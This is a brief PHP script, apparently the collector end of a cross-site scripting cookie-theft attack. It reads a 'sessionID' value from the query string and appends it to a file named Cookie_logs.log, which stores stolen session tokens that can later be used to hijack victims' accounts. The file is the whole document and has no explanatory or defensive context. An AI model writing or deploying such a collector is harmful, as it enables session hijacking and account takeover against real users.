<?php
if(!empty($_GET['sessionID'])) {
    $logfile = fopen('Cookie_logs.log', 'a+');
    fwrite($logfile, $_GET['sessionID']);
    fclose($logfile);
}
?>